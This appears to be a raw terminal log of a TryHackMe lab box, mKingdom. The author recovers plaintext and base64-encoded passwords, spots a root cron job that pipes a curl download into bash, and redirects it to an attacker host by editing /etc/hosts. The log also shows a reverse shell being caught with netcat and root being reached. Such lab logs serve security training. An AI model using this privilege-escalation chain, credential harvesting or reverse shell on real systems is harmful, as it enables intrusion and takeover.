Notes from mKingdom THM

10.10.189.184
nmap -sV -sC -vv 10.10.189.184 -Pn
PORT   STATE SERVICE REASON         VERSION
85/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
0H N0! PWN3D 4G4IN<
10.10.189.184:85/app
concrete5 - 8.5.2"
python -c "import pty;pty.spawn('/bin/bash')"
find / -name "index.php" 2>dev/null
<html/app/castle$ find . -name "*database*" 2>/dev/null                      
./application/config/database.php
./concrete/controllers/single_page/dashboard/system/environment/database_charset.php
./concrete/single_pages/dashboard/system/environment/database_charset.php
./concrete/vendor/dapphp/securimage/database
./concrete/config/database.php
cat application/config/database.php | grep "password"
  'password' => 'toadisthebest',
  toad
find / -perm /4000 2>/dev/null
  sudu -l this is to see what permissions the users has
  echo 'aWthVGVOVEFOdEVTCg==' | base64 -d
  PWD_token=aWthVGVOVEFOdEVTCg==
  ikaTeNTANtES
  mario
   (ALL) /usr/bin/id
   find / -perm /4000 2>/dev/null

/sbin/init
2024/09/02 02:04:01 CMD: UID=0     PID=2866   | bash 
2024/09/02 02:04:01 CMD: UID=0     PID=2865   | curl mkingdom.thm:85/app/castle/application/counter.sh 
2024/09/02 02:04:01 CMD: UID=0     PID=2864   | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log  
2024/09/02 02:04:01 CMD: UID=0     PID=2863   | CRON 
2024/09/02 02:04:01 CMD: UID=0     PID=2868   | bash 
2024/09/02 02:04:01 CMD: UID=0     PID=2870   | bash 
2024/09/02 02:04:01 CMD: UID=0     PID=2869   | ls -laR /var/www/html/app/castle
python -c "import pty;pty.spawn('/bin/bash')"
find /path/to/search -name "filename"
/var/www/html/app/castle/application
www-data@mkingdom:/var/www/html/app/castle/application$ ./counter.sh
./counter.sh
bash: ./counter.sh: Permission denied
www-data@mkingdom:/var/www/html/app/castle/application$ cd 
/var/www/html/app/castle$ 
/sbin/init
2024/09/02 03:34:01 CMD: UID=0     PID=2439   | bash 
2024/09/02 03:34:01 CMD: UID=0     PID=2438   | curl mkingdom.thm:85/app/castle/application/counter.sh 
2024/09/02 03:34:01 CMD: UID=0     PID=2437   | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log  
sed -i s/127.0.1.1/10.10.43.139/g tmp_hosts
mkingdom.thm


ls
Desktop    Downloads  Pictures  Public     tmp_hosts  Videos
Documents  Music      pspy64    Templates  user.txt
mario@mkingdom:~$ cat /etc/hosts
cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	mkingdom.thm
127.0.0.1	backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

mario@mkingdom:~$ strings tmp_hosts
strings tmp_hosts
127.0.0.1	localhost
10.10.43.139	mkingdom.thm
127.0.0.1	backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
mario@mkingdom:~$ cp  tmp_hosts /etc/hosts^[[D^[[D^[[D^[[D^[[D^[[D^[[D^[[D^[[D^[  
cp  tmp_hosts /etc/hols          
mario@mkingdom:~$ cp  tmp_hosts /etc/holssts
cp: cannot create regular file \u2018/etc/holssts\u2019: Permission denied
mario@mkingdom:~$ ls
ls
Desktop    Downloads  Pictures  Public     tmp_hosts  Videos
Documents  Music      pspy64    Templates  user.txt
mario@mkingdom:~$ cp tmp_hosts /etc/hosts
cp tmp_hosts /etc/hosts
mario@mkingdom:~$ cat /etc/hosts
cat /etc/hosts
127.0.0.1	localhost
10.10.43.139	mkingdom.thm
127.0.0.1	backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

mario@mkingdom:~$ /bin/bash -p
/bin/bash -p
bash-4.3# whoami
whoami
root
bash-4.3# cd /root
cd /root
bash-4.3# ls 
ls
counter.sh  root.txt
bash-4.3# cat root.txt
cat root.txt
cat: root.txt: Permission denied
bash-4.3# ls -al root.txt
ls -al root.txt
-rw-r--r-- 1 root root 38 Nov 27  2023 root.txt
bash-4.3# strings root.txt
strings root.txt
thm{flagwas located here}


root@ip-10-10-43-139:~/app/castle/application# ls
root@ip-10-10-43-139:~/app/castle/application# nano counter.sh
root@ip-10-10-43-139:~/app/castle/application# ls
counter.sh
root@ip-10-10-43-139:~/app/castle/application# cd ../../..
root@ip-10-10-43-139:~# python -m http.server 85
Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/) ...
10.10.72.216 - - [02/Sep/2024 09:06:02] "GET /app/castle/application/counter.sh HTTP/1.1" 200 -
10.10.72.216 - - [02/Sep/2024 09:07:02] "GET /app/castle/application/counter.sh HTTP/1.1" 200 -
10.10.72.216 - - [02/Sep/2024 09:08:02] "GET /app/castle/application/counter.sh HTTP/1.1" 200 -

2024/09/02 02:03:49 CMD: UID=0     PID=1      | /sbin/init
2024/09/02 02:04:01 CMD: UID=0     PID=2866   | bash 
2024/09/02 02:04:01 CMD: UID=0     PID=2865   | curl mkingdom.thm:85/app/castle/application/counter.sh 
2024/09/02 02:04:01 CMD: UID=0     PID=2864   | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log  
2024/09/02 02:04:01 CMD: UID=0     PID=2863   | CRON 
2024/09/02 02:04:01 CMD: UID=0     PID=2868   | bash 
2024/09/02 02:04:01 CMD: UID=0     PID=2870   | bash 
2024/09/02 02:04:01 CMD: UID=0     PID=2869   | ls -laR /var/www/html/app/castle/ 
2024/09/02 02:04:01 CMD: UID=0     PID=2871   | 
^C
root@ip-10-10-43-139:~# clear

root@ip-10-10-43-139:~# nc lvnp 8888
nc: getaddrinfo for host "lvnp" port 8888: Temporary failure in name resolution
root@ip-10-10-43-139:~# nc -lvnp 8888
Listening on [0.0.0.0] (family 0, port 8888)
Connection from 10.10.189.184 57842 received!
Linux mkingdom.thm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 02:06:42 up  1:14,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)
/bin/sh: 0: can't access tty; job control turned off
$ python -c import pty:pty.spawn('/bin/bash')"
/bin/sh: 1: Syntax error: "(" unexpected
$ python -c import pty:pty.spawn('/bin/bash')"
/bin/sh: 1: Syntax error: "(" unexpected
$ python -c import pty;pty.spawn('/bin/bash')"
/bin/sh: 1: Syntax error: word unexpected (expecting ")")
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@mkingdom:/$ su mario 
su mario
Password: ikaTeNTANtES

mario@mkingdom:/$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  srv  usr      vmlinuz.old
boot   etc   initrd.img.old  lost+found  opt   run   sys  var
cdrom  home  lib             media       proc  sbin  tmp  vmlinuz
mario@mkingdom:/$ cd ~     
cd ~
mario@mkingdom:~$ ls
ls
Desktop    Downloads  Pictures  Public     user.txt
Documents  Music      pspy64    Templates  Videos
mario@mkingdom:~$ ls /etc/hosts
ls /etc/hosts
/etc/hosts
mario@mkingdom:~$ ls -la /etc/hosts
ls -la /etc/hosts
-rw-rw-r-- 1 root mario 342 Jan 26  2024 /etc/hosts
mario@mkingdom:~$ cat /etc/hosts
cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	mkingdom.thm
127.0.0.1	backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

mario@mkingdom:~$ cp /etc/hosts/ tmp_hosts
cp /etc/hosts/ tmp_hosts
cp: cannot stat \u2018/etc/hosts/\u2019: Not a directory
mario@mkingdom:~$ cp /etc/hosts tmp_hosts
cp /etc/hosts tmp_hosts
mario@mkingdom:~$ ls
ls
Desktop    Downloads  Pictures  Public     tmp_hosts  Videos
Documents  Music      pspy64    Templates  user.txt
mario@mkingdom:~$ sed -i s/127.0.1.1/10.10.43.139/g tmp_hosts
sed -i s/127.0.1.1/10.10.43.139/g tmp_hosts
mario@mkingdom:~$ cat tmp_hosts
cat tmp_hosts
cat: tmp_hosts: Permission denied
mario@mkingdom:~$ strings tmp_hosts
strings tmp_hosts
127.0.0.1	localhost
10.10.43.139	mkingdom.thm
127.0.0.1	backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
mario@mkingdom:~$ cd tmp_hosts /etc/hosts
cd tmp_hosts /etc/hosts
bash: cd: tmp_hosts: Not a directory
mario@mkingdom:~$ cp tmp_hosts /etc/hosts
cp tmp_hosts /etc/hosts
mario@mkingdom:~$ cat /etc/hosts
cat /etc/hosts
127.0.0.1	localhost
10.10.43.139	mkingdom.thm
127.0.0.1	backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

mario@mkingdom:~$ ls
ls
Desktop    Downloads  Pictures  Public     tmp_hosts  Videos
Documents  Music      pspy64    Templates  user.txt
mario@mkingdom:~$ ls
ls
Desktop    Downloads  Pictures  Public     tmp_hosts  Videos
Documents  Music      pspy64    Templates  user.txt
mario@mkingdom:~$ ls -la
ls -la
total 3132
drwx------ 15 mario mario    4096 Sep  2 02:13 .
drwxr-xr-x  4 root  root     4096 Jun  9  2023 ..
lrwxrwxrwx  1 mario mario       9 Jun  9  2023 .bash_history -> /dev/null
-rw-r--r--  1 mario mario     220 Jun  7  2023 .bash_logout
-rw-r--r--  1 mario mario    3637 Jun  7  2023 .bashrc
drwx------ 11 mario mario    4096 Jan 26  2024 .cache
drwx------  3 mario mario    4096 Jan 29  2024 .compiz
drwx------ 14 mario mario    4096 Jan 26  2024 .config
drwxr-xr-x  2 mario mario    4096 Jan 26  2024 Desktop
-rw-r--r--  1 mario mario      25 Jan 26  2024 .dmrc
drwxr-xr-x  2 mario mario    4096 Jan 26  2024 Documents
drwxr-xr-x  2 mario mario    4096 Jan 26  2024 Downloads
drwx------  3 mario mario    4096 Jan 29  2024 .gconf
-rw-------  1 mario mario    1026 Jan 29  2024 .ICEauthority
drwx------  3 mario mario    4096 Jan 26  2024 .local
drwxr-xr-x  2 mario mario    4096 Jan 26  2024 Music
drwxr-xr-x  2 mario mario    4096 Jan 26  2024 Pictures
-rw-r--r--  1 mario mario     675 Jun  7  2023 .profile
-rwxrwxr-x  1 mario mario 3104768 Sep  2 01:57 pspy64
drwxr-xr-x  2 mario mario    4096 Jan 26  2024 Public
drwxr-xr-x  2 mario mario    4096 Jan 26  2024 Templates
-rw-rw-r--  1 mario mario     345 Sep  2 02:13 tmp_hosts
-rw-r--r--  1 root  root       38 Nov 27  2023 user.txt
drwxr-xr-x  2 mario mario    4096 Jan 26  2024 Videos
-rw-------  1 mario mario      57 Jan 29  2024 .Xauthority
-rw-------  1 mario mario    1581 Jan 29  2024 .xsession-errors
-rw-------  1 mario mario     805 Jan 26  2024 .xsession-errors.old
mario@mkingdom:~$ ls
ls
Desktop    Downloads  Pictures  Public     tmp_hosts  Videos
Documents  Music      pspy64    Templates  user.txt
mario@mkingdom:~$ cd Downloads
cd Downloads
mario@mkingdom:~/Downloads$ ls
ls
mario@mkingdom:~/Downloads$ ls
ls
mario@mkingdom:~/Downloads$ cat ls
cat ls
cat: ls: No such file or directory
mario@mkingdom:~/Downloads$ cat tmp_hosts
cat tmp_hosts
cat: tmp_hosts: No such file or directory
mario@mkingdom:~/Downloads$ ls
ls
mario@mkingdom:~/Downloads$ cd
cd
mario@mkingdom:~$ cd ..
cd ..
mario@mkingdom:/home$ ls
ls
mario  toad
mario@mkingdom:/home$ toad
toad
No command 'toad' found, did you mean:
 Command 'trad' from package 'radiance' (universe)
 Command 'tload' from package 'procps' (main)
toad: command not found
mario@mkingdom:/home$ su toad
su toad
Password: toadisthebest

toad@mkingdom:/home$ ls
ls
mario  toad
toad@mkingdom:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root  root  4096 Jun  9  2023 .
drwxr-xr-x 23 root  root  4096 Jun  7  2023 ..
drwx------ 15 mario mario 4096 Sep  2 02:13 mario
drwxrwx--- 16 toad  toad  4096 Jan 29  2024 toad
toad@mkingdom:/home$ su mario
su mario
Password: ikaTeNTANtES

mario@mkingdom:/home$ wget http:10.10.43.139:8080/pspy
wget http:10.10.43.139:8080/pspy
--2024-09-02 02:44:34--  ftp://http/10.10.43.139:8080/pspy
           => \u2018pspy\u2019
Resolving http (http)... failed: Name or service not known.
wget: unable to resolve host address \u2018http\u2019
mario@mkingdom:/home$ ls
ls
mario  toad
mario@mkingdom:/home$ wget http://10.10.43.139:8080/pspy
wget http://10.10.43.139:8080/pspy
--2024-09-02 02:45:02--  http://10.10.43.139:8080/pspy
Connecting to 10.10.43.139:8080... connected.
HTTP request sent, awaiting response... 404 File not found
2024-09-02 02:45:02 ERROR 404: File not found.

mario@mkingdom:/home$ wget http://10.10.43.139:8080/pspy64
wget http://10.10.43.139:8080/pspy64
--2024-09-02 02:47:16--  http://10.10.43.139:8080/pspy64
Connecting to 10.10.43.139:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
pspy64: Permission denied

Cannot write to \u2018pspy64\u2019 (Permission denied).
mario@mkingdom:/home$ wget http://10.10.43.139:8080/pspy64
wget http://10.10.43.139:8080/pspy64
--2024-09-02 02:49:01--  http://10.10.43.139:8080/pspy64
Connecting to 10.10.43.139:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
pspy64: Permission denied

Cannot write to \u2018pspy64\u2019 (Permission denied).
mario@mkingdom:/home$ ls
ls
mario  toad
mario@mkingdom:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root  root  4096 Jun  9  2023 .
drwxr-xr-x 23 root  root  4096 Jun  7  2023 ..
drwx------ 15 mario mario 4096 Sep  2 02:13 mario
drwxrwx--- 16 toad  toad  4096 Jan 29  2024 toad
mario@mkingdom:/home$ wget http:10.10.189.184:8080/pspy64
wget http:10.10.189.184:8080/pspy64
--2024-09-02 02:49:36--  ftp://http/10.10.189.184:8080/pspy64
           => \u2018pspy64\u2019
Resolving http (http)... failed: Name or service not known.
wget: unable to resolve host address \u2018http\u2019
mario@mkingdom:/home$ wget http://10.10.189.184:8080/pspy64
wget http://10.10.189.184:8080/pspy64
--2024-09-02 02:50:54--  http://10.10.189.184:8080/pspy64
Connecting to 10.10.189.184:8080... failed: Connection refused.
mario@mkingdom:/home$ wget http://10.10.43.139:8080/pspy64
wget http://10.10.43.139:8080/pspy64
--2024-09-02 02:51:42--  http://10.10.43.139:8080/pspy64
Connecting to 10.10.43.139:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
pspy64: Permission denied

Cannot write to \u2018pspy64\u2019 (Permission denied).
root@ip-10-10-43-139:~# nc -lvnp 8888
Listening on [0.0.0.0] (family 0, port 8888)
^C
root@ip-10-10-43-139:~# nc -lvnp 8888
Listening on [0.0.0.0] (family 0, port 8888)

Connection from 10.10.72.216 51088 received!
Linux mkingdom.thm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 03:57:30 up  1:05,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)
/bin/sh: 0: can't access tty; job control turned off
$ $ python -c "import pty;pty.spawn('/bin/bash')"
www-data@mkingdom:/$ ls
ls
bin    dev   initrd.img      lib64	 mnt   root  srv  usr	   vmlinuz.old
boot   etc   initrd.img.old  lost+found  opt   run   sys  var
cdrom  home  lib	     media	 proc  sbin  tmp  vmlinuz
www-data@mkingdom:/$ find / -name "index.php" 2>dev/null
find / -name "index.php" 2>dev/null
/var/www/html/app/castle/index.php
www-data@mkingdom:/$ cd /var/www/html/app/castle/
cd /var/www/html/app/castle/
www-data@mkingdom:/var/www/html/app/castle$ ls
ls
LICENSE.TXT  composer.json  concrete   packages    updates
application  composer.lock  index.php  robots.txt
www-data@mkingdom:/var/www/html/app/castle$ cd application
cd application
www-data@mkingdom:/var/www/html/app/castle/application$ ls
ls
attributes	config	     files	 mail		 themes
authentication	controllers  index.html  page_templates  tools
blocks		counter.sh   jobs	 single_pages	 views
bootstrap	elements     languages	 src
www-data@mkingdom:/var/www/html/app/castle/application$ ls
ls
attributes	config	     files	 mail		 themes
authentication	controllers  index.html  page_templates  tools
blocks		counter.sh   jobs	 single_pages	 views
bootstrap	elements     languages	 src
www-data@mkingdom:/var/www/html/app/castle/application$ nano counter.sh
nano counter.sh
Error opening terminal: unknown.
www-data@mkingdom:/var/www/html/app/castle/application$ mv counter.sh /root/app/castle/application
<html/app/castle/application$ mv counter.sh /root/app/castle/application     
mv: failed to access '/root/app/castle/application': Permission denied
www-data@mkingdom:/var/www/html/app/castle/application$ cp counter.sh /root/app/castle/application
<html/app/castle/application$ cp counter.sh /root/app/castle/application     
cp: failed to access '/root/app/castle/application': Permission denied


